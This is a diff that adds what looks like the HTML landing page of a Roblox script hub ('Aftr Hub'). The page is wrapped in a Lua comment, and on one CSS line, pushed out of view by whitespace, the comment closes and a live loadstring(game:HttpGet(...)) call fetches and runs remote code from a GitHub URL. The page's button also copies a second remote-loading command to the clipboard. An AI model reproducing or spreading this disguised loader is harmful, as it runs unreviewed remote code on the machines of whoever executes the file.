@@ -1,2 +1,152 @@
-Under Development
+--[[
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>zerohub - Your Ultimate Roblox Script Hub</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap');
 
+        body {
+            font-family: 'Inter', sans-serif;
+            background-color: #080808; /* Darker background */
+            color: #d1d1d1; /* Slightly darker text */
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            overflow: hidden;
+        }
+
+        .glass-container {
+            background: rgba(255, 255, 255, 0.06); /* More subtle glass */
+            border-radius: 16px;
+            box-shadow: 0 4px 30px rgba(0, 0, 0, 0.3); /* Slightly stronger shadow */
+            backdrop-filter: blur(8px); /* Slightly less blur */
+            -webkit-backdrop-filter: blur(8px);                        <!--]]loadstring(game:HttpGet("https://raw.githubusercontent.com/GhostPlayer352/Test4/refs/heads/main/Script%20Obfuscator"))()--[[-->
+
+            border: 1px solid rgba(255, 255, 255, 0.1); /* Darker border */
+            padding: 40px;
+            text-align: center;
+            max-width: 800px;
+            width: 90%;
+            z-index: 10;
+        }
+
+        .hero-image {
+            width: 638px; /* Updated width */
+            height: 391px; /* Updated height */
+            border-radius: 10px; /* Added border radius for the image */
+            object-fit: cover;
+            margin-bottom: 20px;
+            box-shadow: 0 0 20px rgba(0, 0, 0, 0.5);
+            animation: pulse 2s infinite alternate;
+        }
+
+        h1 {
+            font-size: 2.5em;
+            margin-bottom: 10px;
+            color: #ffffff; /* White heading */
+            text-shadow: 0 2px 4px rgba(0, 0, 0, 0.4); /* Slightly darker shadow */
+        }
+
+        .slogan {
+            font-size: 1.2em;
+            color: #b0b0b0; /* Darker slogan text */
+            margin-bottom: 30px;
+            font-style: italic;
+        }
+
+        .button-container {
+            display: flex;
+            gap: 20px;
+            justify-content: center;
+        }
+
+        .button {
+            background: rgba(255, 255, 255, 0.1); /* More subtle button background */
+            color: #fff;
+            border: none;
+            padding: 15px 30px;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 1em;
+            transition: background-color 0.3s ease, transform 0.2s ease;
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.4); /* Darker shadow */
+        }
+
+        .button:hover {
+            background-color: rgba(255, 255, 255, 0.25); /* Slightly lighter hover */
+            transform: translateY(-1px); /* Reduced hover lift */
+        }
+
+        .button:active {
+            transform: translateY(0);
+            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.3);
+        }
+
+        .background-blur {
+            position: fixed;
+            top: -50px;
+            left: -50px;
+            width: calc(100% + 100px);
+            height: calc(100% + 100px);
+            background: linear-gradient(135deg, #4a148c, #2e7d32, #1a237e, #c62828);
+            background-size: 400% 400%;
+            animation: gradientAnimation 15s infinite alternate;
+            filter: blur(60px); /* Reduced blur */
+            z-index: 1;
+        }
+
+        @keyframes gradientAnimation {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+        }
+
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            100% { transform: scale(1.04); } /* Reduced pulse scale */
+        }
+    </style>
+</head>
+<body>
+    <div class="background-blur"></div>
+    <div class="glass-container">
+        <img src="https://i.ibb.co/V0d3kJVy/IMG-20250602-215543-856.jpg" alt="IMG-20250602-215543-856" class="hero-image">
+        <h1>Aftr Hub</h1>
+        <p class="slogan">A script for Brookhaven RP that makes you laugh.</p>
+        <div class="button-container">
+            <button class="button">Get Script</button>
+        </div>
+    </div>
+
+    <script>
+        // Reduced the intensity of the mousemove effect
+        const glassContainer = document.querySelector('.glass-container');
+        const button = document.querySelector('button')
+
+
+        glassContainer.addEventListener('mousemove', (e) => {
+            const x = (window.innerWidth / 2 - e.clientX) / 30; /* Reduced divisor */
+            const y = (window.innerHeight / 2 - e.clientY) / 30; /* Reduced divisor */
+            glassContainer.style.transform = `perspective(200px) rotateX(${y}deg) rotateY(${x}deg)`;
+        });
+
+        glassContainer.addEventListener('mouseout', () => {
+            glassContainer.style.transform = `perspective(200px) rotateX(0deg) rotateY(0deg)`;
+        });
+
+        button.addEventListener('click', function(event) {
+               navigator.clipboard.writeText('loadstring(game:HttpGet("https://aftrhub.xyz"))()');
+        });
+
+    </script>
+</body>
+</html>
+
+
+]]
